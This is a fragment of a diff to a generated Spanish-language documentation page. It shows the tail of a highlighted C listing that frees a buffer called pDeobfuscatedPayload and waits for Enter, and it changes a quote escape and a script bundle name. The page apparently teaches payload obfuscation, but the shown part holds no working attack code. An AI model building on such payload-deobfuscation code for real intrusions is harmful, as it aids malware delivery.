 </span><span id="__span-11-50"><a id="__codelineno-11-50" name="__codelineno-11-50" href="#__codelineno-11-50"></a>
 </span><span id="__span-11-51"><a id="__codelineno-11-51" name="__codelineno-11-51" href="#__codelineno-11-51"></a><span class="w">    </span><span class="n">HeapFree</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">pDeobfuscatedPayload</span><span class="p">);</span>
-</span><span id="__span-11-52"><a id="__codelineno-11-52" name="__codelineno-11-52" href="#__codelineno-11-52"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[#] Press &lt;Enter&gt; To Quit ... &quot;</span><span class="p">);</span>
+</span><span id="__span-11-52"><a id="__codelineno-11-52" name="__codelineno-11-52" href="#__codelineno-11-52"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[#] Press &lt;Enter&gt; To Quit ... "</span><span class="p">);</span>
 </span><span id="__span-11-53"><a id="__codelineno-11-53" name="__codelineno-11-53" href="#__codelineno-11-53"></a><span class="w">    </span><span class="n">getchar</span><span class="p">();</span>
 </span><span id="__span-11-54"><a id="__codelineno-11-54" name="__codelineno-11-54" href="#__codelineno-11-54"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
 </span><span id="__span-11-55"><a id="__codelineno-11-55" name="__codelineno-11-55" href="#__codelineno-11-55"></a><span class="p">}</span>
@@ -1926,7 +1986,7 @@
       <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.instant.progress", "navigation.sections", "navigation.top", "navigation.tracking", "navigation.indexes", "toc.integrate", "content.code.copy", "content.action.edit", "content.tabs.link"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado al portapapeles", "clipboard.copy": "Copiar al portapapeles", "search.result.more.one": "1 m\u00e1s en esta p\u00e1gina", "search.result.more.other": "# m\u00e1s en esta p\u00e1gina", "search.result.none": "No se encontraron documentos", "search.result.one": "1 documento encontrado", "search.result.other": "# documentos encontrados", "search.result.placeholder": "Teclee para comenzar b\u00fasqueda", "search.result.term.missing": "Falta", "select.version": "Seleccionar versi\u00f3n"}, "version": null}</script>
     
     
-      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      <script src="../../assets/javascripts/bundle.d7400e89.min.js"></script>
       
     
   </body>
